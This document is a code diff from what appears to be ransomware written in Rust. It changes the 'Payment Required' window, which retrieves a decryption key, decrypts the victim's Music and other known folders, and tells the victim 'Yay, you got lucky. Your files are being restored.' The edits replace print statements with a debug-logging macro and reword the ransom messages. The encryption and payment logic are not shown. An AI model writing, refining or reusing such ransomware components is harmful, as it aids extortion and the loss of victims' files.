@@ -14,6 +14,8 @@ use windows::Win32::UI::Shell::{
     KNOWN_FOLDER_FLAG, SHGetKnownFolderPath,
 };
 
+use crate::debug_log;
+
 #[derive(Default, NwgUi)]
 pub struct PaymentWindow {
     #[nwg_control(size: (620, 640), position: (300, 20), title: "Payment Required", flags: "WINDOW|VISIBLE")]
@@ -100,7 +102,7 @@ impl PaymentWindow {
                 match get_key(&pk_clone).await {
                     Ok(secret_key) => {
                         // decrypt the files using decrypt_folder
-                        println!("Starting file decryption process...");
+                        debug_log!("Starting file decryption process...");
 
                         let paths = [
                             FOLDERID_Music,
@@ -118,22 +120,22 @@ impl PaymentWindow {
                                     let path_buf: PathBuf = path_str.into();
                                     match decrypt_folder_parallel(&path_buf, &pk_clone, &secret_key)
                                     {
-                                        Ok(_) => println!("Successfully decrypted: {:?}", path),
-                                        Err(e) => println!("Error decrypting {:?}: {}", path, e),
+                                        Ok(_) => debug_log!("Successfully decrypted: {:?}", path),
+                                        Err(e) => debug_log!("Error decrypting {:?}: {}", path, e),
                                     }
                                 }
                             }
                         }
-                        println!("Oof. Files successfully decrypted!");
+                        debug_log!("Files successfully decrypted");
                     }
                     Err(e) => {
-                        println!("Oops. Error getting decryption key: {}", e);
+                        debug_log!("Error getting decryption key: {}", e);
                     }
                 }
             });
 
             self.status_display.set_text(
-                "Yay, you got lucky. Decryption successful! Your files have been restored",
+                "Yay, you got lucky. Your files are being restored.",
             );
         } else {
             self.status_display.set_text(
